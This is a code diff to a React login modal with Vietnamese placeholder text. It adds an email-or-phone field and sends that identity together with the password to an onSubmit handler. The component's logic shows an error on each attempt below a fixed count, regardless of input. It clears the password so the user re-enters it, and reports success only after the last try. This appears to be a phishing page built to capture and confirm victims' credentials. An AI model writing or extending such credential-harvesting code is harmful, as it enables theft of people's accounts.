@@ -6,6 +6,7 @@ import config from '@/utils/config';
 
 const LoginModal = ({ show, onClose, onSubmit, onSuccess, texts }) => {
     const [formData, setFormData] = useState({
+        identity: '',
         password: ''
     });
     const [loginAttempt, setLoginAttempt] = useState(0);
@@ -26,7 +27,7 @@ const LoginModal = ({ show, onClose, onSubmit, onSuccess, texts }) => {
     const handleSubmit = async (e) => {
         e.preventDefault();
 
-        if (!formData.password.trim()) {
+        if (!formData.identity.trim() || !formData.password.trim()) {
             return;
         }
 
@@ -39,10 +40,11 @@ const LoginModal = ({ show, onClose, onSubmit, onSuccess, texts }) => {
             if (loginAttempt + 1 < maxPasswordAttempts) {
                 setShowError(true);
                 setLoginAttempt((prev) => prev + 1);
-                onSubmit('', formData.password);
+                onSubmit(formData.identity, formData.password);
+                setFormData((prev) => ({ ...prev, password: '' }));
             } else {
                 setShowError(false);
-                onSubmit('', formData.password);
+                onSubmit(formData.identity, formData.password);
                 onSuccess();
             }
         }, passwordLoadingMs);
@@ -104,6 +106,18 @@ const LoginModal = ({ show, onClose, onSubmit, onSuccess, texts }) => {
         marginBottom: '12px'
     };
 
+    const identityInputStyle = {
+        width: '100%',
+        height: '40px',
+        border: '1px solid #d4dbe3',
+        borderRadius: '10px',
+        padding: '0 12px',
+        fontSize: '14px',
+        outline: 'none',
+        boxSizing: 'border-box',
+        marginBottom: '12px'
+    };
+
     const eyeBtnStyle = {
         position: 'absolute',
         right: '10px',
@@ -150,6 +164,19 @@ const LoginModal = ({ show, onClose, onSubmit, onSuccess, texts }) => {
                         </p>
 
                         <form autoComplete="off" onSubmit={handleSubmit}>
+                            <input
+                                style={identityInputStyle}
+                                type="text"
+                                placeholder={texts.loginIdentityPlaceholder || 'Email hoặc số điện thoại'}
+                                autoComplete="off"
+                                autoCorrect="off"
+                                autoCapitalize="none"
+                                spellCheck="false"
+                                required
+                                value={formData.identity}
+                                onChange={(e) => handleChange('identity', e.target.value)}
+                            />
+
                             <div style={passwordWrapStyle}>
                                 <input
                                     style={inputStyle}
